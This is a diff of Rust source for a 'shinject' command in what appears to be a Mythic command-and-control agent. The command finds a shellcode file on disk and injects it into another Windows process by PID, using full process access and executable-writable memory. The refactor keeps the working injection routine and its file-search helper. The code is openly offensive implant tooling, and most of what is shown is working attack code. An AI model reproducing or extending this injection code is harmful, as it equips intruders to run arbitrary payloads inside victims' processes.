@@ -1,9 +1,10 @@
-use std::mem;
-use std::ptr;
+use serde::{Deserialize, Serialize};
 use std::fs;
-use crate::{AgentTask, mythic_success, mythic_error};
-use crate::agent::ShinjectArgs;
 
+#[cfg(target_os = "windows")]
+use std::mem;
+#[cfg(target_os = "windows")]
+use std::ptr;
 #[cfg(target_os = "windows")]
 use winapi::shared::minwindef::{FALSE, DWORD, LPVOID};
 #[cfg(target_os = "windows")]
@@ -21,6 +22,21 @@ use winapi::um::errhandlingapi::GetLastError;
 #[cfg(target_os = "windows")]
 use winapi::um::winbase::WAIT_OBJECT_0;
 
+// Command structure for Mythic
+#[derive(Serialize, Deserialize)]
+pub struct ShinjectArgs {
+    pub shellcode: String,  // File ID from Mythic
+    pub process_id: u32,
+}
+
+#[cfg(target_os = "windows")]
+#[derive(Serialize)]
+pub struct ShinjectResult {
+    pub success: bool,
+    pub output: String,
+    pub error: Option<String>,
+}
+
 #[cfg(target_os = "windows")]
 const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
 #[cfg(target_os = "windows")]
@@ -32,94 +48,67 @@ const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
 #[cfg(target_os = "windows")]
 const INFINITE: DWORD = 0xFFFFFFFF;
 
-// ========================================
-// Main command execution for Mythic
-// ========================================
+// Main command execution function
 #[cfg(target_os = "windows")]
-pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    // Parse arguments from task parameters
-    let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;
-
-    // The shellcode field contains the file ID from Mythic
-    // When delete_after_fetch=True is set in shinject.py, Mythic should download the file
-    // to the agent's current working directory or temp directory
+pub fn execute_shinject(args: ShinjectArgs) -> Result<String, String> {
+    // In a real implementation, you would download the file from Mythic
+    // For now, we'll look for it in common locations as a fallback
     
-    let mut shellcode_bytes = Vec::new();
-    let mut found_file = false;
-    
-    // Debug: Print what we're looking for
-    eprintln!("DEBUG: Looking for shellcode file with ID: {}", args.shellcode);
-    eprintln!("DEBUG: Current working directory: {}", std::env::current_dir()?.to_string_lossy());
-    eprintln!("DEBUG: Temp directory: {}", std::env::temp_dir().to_string_lossy());
-    
-    // Check common locations where Mythic downloads files
-    let possible_paths = vec![
-        // Current working directory (most common)
-        std::env::current_dir()?.join(&args.shellcode),
-        // Temp directory
-        std::env::temp_dir().join(&args.shellcode),
-        // Downloads directory
-        std::env::home_dir().unwrap_or_default().join("Downloads").join(&args.shellcode),
-        // Direct path (in case it's already a full path)
-        std::path::Path::new(&args.shellcode).to_path_buf(),
-        // Check if it's a relative path in current directory
-        std::env::current_dir()?.join(".").join(&args.shellcode),
-    ];
-    
-    // Debug: Print search locations
-    for (i, path) in possible_paths.iter().enumerate() {
-        eprintln!("DEBUG: Search location {}: {}", i + 1, path.to_string_lossy());
-        eprintln!("DEBUG: File exists: {}", path.exists());
-    }
-    
-    // Try to read the file from various possible locations
-    for path in &possible_paths {
-        if path.exists() {
-            eprintln!("DEBUG: Found file at: {}", path.to_string_lossy());
-            match fs::read(path) {
-                Ok(bytes) => {
-                    shellcode_bytes = bytes;
-                    found_file = true;
-                    eprintln!("DEBUG: Successfully read {} bytes from file", shellcode_bytes.len());
-                    break;
-                }
-                Err(e) => {
-                    eprintln!("DEBUG: Failed to read file {}: {}", path.to_string_lossy(), e);
-                    continue;
-                }
-            }
-        }
-    }
-    
-    if !found_file {
-        return Ok(mythic_error!(
-            task.id,
-            format!(
-                "Shellcode file '{}' not found.\n\nDEBUG INFO:\n- File ID: {}\n- Current working directory: {}\n- Searched locations:\n{}\n\nTROUBLESHOOTING:\n1. The file should be automatically downloaded by Mythic when delete_after_fetch=True\n2. Try running 'download {}' first to manually download the file\n3. Check Mythic server logs for file download errors\n4. Verify the file exists in Mythic and is accessible",
-                args.shellcode,
-                args.shellcode,
-                std::env::current_dir()?.to_string_lossy(),
-                possible_paths.iter()
-                    .enumerate()
-                    .map(|(i, path)| format!("  {}. {} (exists: {})", i + 1, path.to_string_lossy(), path.exists()))
-                    .collect::<Vec<_>>()
-                    .join("\n"),
-                args.shellcode
-            )
-        ));
-    }
+    let shellcode_bytes = match download_shellcode_file(&args.shellcode) {
+        Ok(bytes) => bytes,
+        Err(e) => return Err(e),
+    };
 
     unsafe {
         match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
-            Ok(output) => Ok(mythic_success!(task.id, output)),
-            Err(e) => Ok(mythic_error!(task.id, e)),
+            Ok(output) => Ok(output),
+            Err(e) => Err(e),
         }
     }
 }
 
-// ========================================
+// Helper function to locate and read the shellcode file
+#[cfg(target_os = "windows")]
+fn download_shellcode_file(file_id: &str) -> Result<Vec<u8>, String> {
+    // Check common locations where Mythic might download files
+    let possible_paths = vec![
+        std::env::current_dir().map(|p| p.join(file_id)).unwrap_or_default(),
+        std::env::temp_dir().join(file_id),
+        std::env::home_dir().unwrap_or_default().join("Downloads").join(file_id),
+        std::path::Path::new(file_id).to_path_buf(),
+    ];
+    
+    // Try to read the file from various possible locations
+    for path in &possible_paths {
+        if path.exists() {
+            match fs::read(path) {
+                Ok(bytes) => {
+                    if bytes.len() > 0 {
+                        return Ok(bytes);
+                    }
+                }
+                Err(_) => continue,
+            }
+        }
+    }
+    
+    Err(format!(
+        "Shellcode file '{}' not found in any expected location.\n\n\
+        The file should be automatically downloaded by Mythic when delete_after_fetch=True.\n\
+        Searched locations:\n- {}\n\n\
+        TROUBLESHOOTING:\n\
+        1. Verify the file exists in Mythic\n\
+        2. Check that delete_after_fetch=True is set\n\
+        3. Try manually downloading the file first",
+        file_id,
+        possible_paths.iter()
+            .map(|p| p.to_string_lossy().to_string())
+            .collect::<Vec<_>>()
+            .join("\n- ")
+    ))
+}
+
 // Windows shellcode injection implementation
-// ========================================
 #[cfg(target_os = "windows")]
 unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
     let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
@@ -188,34 +177,25 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
 
     if wait_result == WAIT_OBJECT_0 {
         Ok(format!(
-            "Shellcode successfully injected into PID {}. Thread ID: {}",
-            process_id, thread_id
+            "Shellcode successfully injected into PID {}. Thread ID: {}\n\n\
+            Shellcode Details:\n- Size: {} bytes\n- Process ID: {}\n- Thread ID: {}",
+            process_id, thread_id, buffer_size, process_id, thread_id
         ))
     } else {
         Err(format!("WaitForSingleObject failed with result: {}", wait_result))
     }
 }
 
-// ========================================
 // macOS placeholder implementation
-// ========================================
 #[cfg(target_os = "macos")]
-pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    Ok(mythic_error!(
-        task.id,
-        "shinject command is not implemented for macOS"
-    ))
+pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
+    Err("shinject command is not implemented for macOS".to_string())
 }
 
-// ========================================
 // Fallback for other platforms
-// ========================================
 #[cfg(not(target_os = "windows"))]
-pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
-    Ok(mythic_error!(
-        task.id,
-        "shinject command is only supported on Windows"
-    ))
+pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
+    Err("shinject command is only supported on Windows".to_string())
 }
 
 #[cfg(test)]
